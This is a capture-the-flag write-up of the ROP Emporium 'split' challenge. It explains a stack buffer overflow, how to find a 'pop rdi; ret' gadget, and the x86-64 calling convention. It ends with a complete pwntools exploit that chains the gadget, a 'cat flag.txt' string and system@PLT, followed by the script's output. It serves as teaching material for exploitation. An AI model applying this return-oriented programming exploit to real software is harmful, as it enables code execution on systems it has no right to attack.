# split

_useful isn't that useful here._

This one is slightly more complicated, but not by much. Here's where we really get into using gadgets to `ret` our way to the finish line.

Opening the file in `rizin` (I use Cutter because I'm a worthless asshole too stupid to use the command line) we see three things.

```text
sym.main
sym.pwnme
sym.usefulFunction
```

Cool. This looks like last time. Let's check `pwnme` and `usefulFunction`:

```c
void pwnme(void)
{
    char buf [32];
    
    memset(buf, 0, 0x20);
    puts("Contriving a reason to ask user for data...");
    printf(0x40083c);
    read(0, buf, 0x60);
    puts("Thank you!");
    return;
}
```

```c
void usefulFunction(void)
{
    system("/bin/ls");
    return;
}
```

This looks a lot like last time, but now we have a problem. `usefulFunction` calls `system()` like we hope it would, but it runs `ls` instead of `cat flag.txt` like we hoped.

Alright. Cool. Let's take stock.

We need to be able to control two main things:

- the call to `system`,
- the parameter passed to it.

And we do this by overwriting the stack.

We can do this with [return-oriented programming](https://en.wikipedia.org/wiki/Return-oriented_programming). Essentially, we look for gadgets - small pieces of code that usually end with a `ret` instruction. This takes advantage of how `ret` works: It pops the saved instruction pointer off the stack and into `rip`, and jumps to it. By overwriting the stack with addresses of such gadgets, we can to chain little bits of code together to run arbitrary code, setting up for us to pop our shell. It works like this:

1. We overwrite the saved `rip` with the address of a gadget by taking advantage of a stack buffer overflow.
2. When the current function returns, `ret` is executed, so the overwritten `rip` is popped off the stack and we jump to the gadget, executing whatever code before `ret`-ing again.
3. If we fed in the address of another gadget before that, we'll pop _that_ off, and execute _that_ gadget, and so on and so forth.
4. Rinse and repeat until profit.

Great. So we just overwrite the stack with addresses. That settles our call to `system`. What's not settled is the parameter we need to pass to it.

This is where gadgets come into play. We can run `strings` to check for any strings that we can use:

```text
$ strings split | grep bin

/bin/ls
/bin/cat flag.txt
```

Interesting. He was kind enough to leave that in there.

Looking at Cutter, we can figure out the address of that string.

```text
;-- str.bin_cat_flag.txt:
;-- usefulString:
0x00601060          .string "/bin/cat flag.txt" ; len=18
```

It even has the `usefulString` symbol attached to it. How nice.

Great. We have the string to pass, and we have the call to `system` (thankfully imported by `usefulFunction`). Now we just need to mash them together in glorious ROP glory.

The [AMD64 System V calling convention](https://wiki.osdev.org/System_V_ABI#x86-64) states that parameters to functions are passed in registers, specifically `rdi`, `rsi`, `rdx`, `rcx`, `r8`, and `r9`, with any additional parameters pushed on the stack in reverse order. Knowing this, we need to have `rdi` point to our `usefulString` right before the call to `system`.

We can do this with a gadget. Bet you were wondering when we were gonna circle back to this.

Since we control the stack, we have to pass in this address on the stack and somehow get it into `rdi`. Of course, we can do this with the `pop` instruction.

So, we're looking for a gadget that executes `pop rdi` and then `ret`. This pops the top of the stack into `rdi`, then returns. Luckily, Cutter has this built right in.

```text
[0x00400742]> /a pop rdi, ret
Searching 1 byte in [0x601090-0x6010d8]
hits: 0
Searching 1 byte in [0x400000-0x4009e0]
hits: 12
Searching 1 byte in [0x601072-0x601088]
hits: 0
Searching 1 byte in [0x600e10-0x601072]
hits: 0
Searching 1 byte in [0x100000-0x1f0000]
hits: 0
fs hits
0x004003e9 hit0_0 5f
0x004003ea hit0_1 5f
0x004003ef hit0_2 5f
0x004003f5 hit0_3 5f
0x00400400 hit0_4 5f
0x00400407 hit0_5 5f
0x00400408 hit0_6 5f
0x0040040d hit0_7 5f
0x00400413 hit0_8 5f
0x00400414 hit0_9 5f
0x004007c3 hit0_10 5f
0x00400801 hit0_11 5f 
```

So many hits. Let's pick `0x4007c3` as our gadget of choice, since looking at Cutter, we know it's in a region marked as executable.

But when we navigate to the function:

```text
0x004007c0      415e                   pop r14
0x004007c2      415f                   pop r15
0x004007c4      c3                     ret
```

What gives?

Turns out, because x86_64 is a multibyte instruction set, instructions don't have to be aligned. We can just jump right into the middle of an instruction, and the CPU, blindly assuming it's at the start of an instruction, will happily interpret it as a completely different instruction.

We can always do a sanity check to make sure we're not misinterpreting this. When we assemble this gadget into machine code:

```python
>>> from pwn import *
>>> context.arch = "amd64"
>>> asm("pop rdi\nret")
b'_\xc3' # the byte representation of '_' is 0x5f, so this is 0x5f 0xc3.
```

Looking at `0x4007c3`, we see `0x5f 0xc3`. Exactly what we need.

Cool. We can do our exploit now.

```python
from pwn import *

# this is important so we can parse the ELF correctly
context.arch = "amd64"
elf = context.binary = ELF('./split')

# overflow the stack with these
POP_RDI_GADGET = p64(0x4007c3)
CATFLAG = p64(0x601060)
# interestingly enough, this is the address of system in the PLT. 
# what's the PLT, you ask? research it, it's important.
SYSTEM = p64(elf.symbols.system)

# overflow the buffer
payload = b'A' * 40

# when pwnme returns, pop this address into rip and jump to it
payload += POP_RDI_GADGET
# put this on the stack to be popped into rdi by above gadget
payload += CATFLAG
# when said gadget returns, pop this into rip and jump to it
payload += SYSTEM

conn = process(elf.path)

conn.recvuntil(b'> ')

conn.send(payload)

print(conn.recvall())
```

Running it:

```text
$ python exploit.py

[*] '/home/sammy/Projects/binexp/ropemporium/split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/sammy/Projects/binexp/ropemporium/split/split': pid 193724
[+] Receiving all data: Done (44B)
[*] Process '/home/sammy/Projects/binexp/ropemporium/split/split' stopped with exit code -11 (SIGSEGV) (pid 193724)
b'Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
```

¯\\\_(ツ)_/¯
